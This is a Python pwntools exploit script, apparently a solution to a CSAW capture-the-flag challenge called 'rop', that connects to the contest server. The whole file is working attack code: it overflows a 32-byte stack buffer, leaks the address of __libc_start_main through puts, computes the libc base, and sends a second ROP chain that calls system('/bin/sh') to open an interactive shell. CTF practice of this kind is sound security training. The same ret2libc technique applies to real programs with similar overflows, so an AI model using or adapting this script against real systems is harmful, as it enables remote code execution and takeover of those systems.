#!/usr/bin/python3
import time
from pwn import *

#Largely inspired and stolen from github.com/IARyan's 2017 CTF repo

context.update(arch="amd64")


def main():
    # Open binary 
    elf = ELF("rop")
    libc = ELF("libc-2.27.so")
    #libc = ELF("local.so") 
    
    # Find rop gadgets
    rop = ROP(elf)

    # Need location of puts
    PUTS = elf.plt['puts']

    # Identify libc start main so we can leak it 
    LIBC_START_MAIN = elf.symbols['__libc_start_main']


    # Identify pop rdi gadget to use later when calling puts
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

    # Connect to csaw server. Much of this had to be tested locally before.
    conn = remote('pwn.chal.csaw.io', 5016 )

    # Allows time to attach to spawned process if using socat to pipe stdin/stdout to network socket. 
    print("Connected, press any key to run exploit")
    sys.stdin.read(1)

    # Basic setup of overflow
    buff_len = 32
    resp = conn.recv()
    buff = b"A"*buff_len
    ebp = b"C"*8
    eip = p64(POP_RDI)

    # Rewriting as 64 bit address for sending ove rnetwork
    libc_main  = p64(LIBC_START_MAIN)
    puts = p64(PUTS)

    # Going to jump back to main to send second payload after leaking address
    MAIN = elf.symbols['main']

    # Used in second payload
    RET = (rop.find_gadget(['ret']))[0]

    # Setup first payload
    payload = buff + ebp + eip + libc_main + puts + p64(MAIN)

    # Send payload
    conn.sendline(payload)

    time.sleep(.5)

    # Recieve leak 
    recieved = conn.recvline().strip()

    # Parse leaked address of libc main 
    leak = u64(recieved.ljust(8, b"\x00"))

    # Calculating true location of libc using leaked address and data gathered from libc-2.27.so
    libc.address = leak - libc.sym['__libc_start_main']

    # Locating /bin/sh from libc
    binsh = next(libc.search(b"/bin/sh"))

    # Going to run system on binsh 
    system = libc.sym['system']

    # No longer first eip in our 2nd payload
    pop_rdi = eip
    
    # Create second payload, while converting some addresses to proper 64 bit addresses, again
    new_rop = buff + ebp +p64(RET) + pop_rdi + p64(binsh) + p64(system)

    # Send second payload
    conn.sendline(new_rop)

    # Spawn interactive shell
    conn.interactive()

if __name__ == '__main__':
    main()

